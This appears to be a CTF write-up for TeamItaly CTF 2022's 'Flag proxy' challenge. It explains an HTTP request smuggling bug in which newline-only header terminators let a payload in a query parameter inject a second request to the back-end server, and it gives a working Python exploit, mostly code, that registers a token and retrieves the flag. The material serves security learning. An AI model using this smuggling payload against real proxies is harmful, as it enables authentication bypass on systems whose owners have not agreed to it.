# TeamItaly CTF 2022

## Flag proxy (41 solves)

I just added authentication to my flag service (server-back) thanks to a proxy (server-front), but a friend said it's useless...

### Solution

The proxy's HTTP client can be exploited to make more than one request to the downstream server.  
These are not valid HTTP requests, because some headers use only `\n` as line terminator, but the downstream server will accept them (it's not appening anymore since Node.JS 18.5.0).

### Exploit

```python
import requests
import random
import string

URL = os.environ.get("URL", "http://flag-proxy.challs.teamitaly.eu")

token = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(20))

payload = 'AAAA\n'
payload += 'Content-Length: 0\n'
payload += 'Connection: keep-alive\n'
payload += '\n'
payload += f'GET /add-token?token={token} HTTP/1.0\n'
payload += 'Host: localhost'

response = requests.get(f"{URL}/flag", params={'token': payload})

print(response.text)

response = requests.get(f"{URL}/flag", params={'token': token})

print(response.text)
```
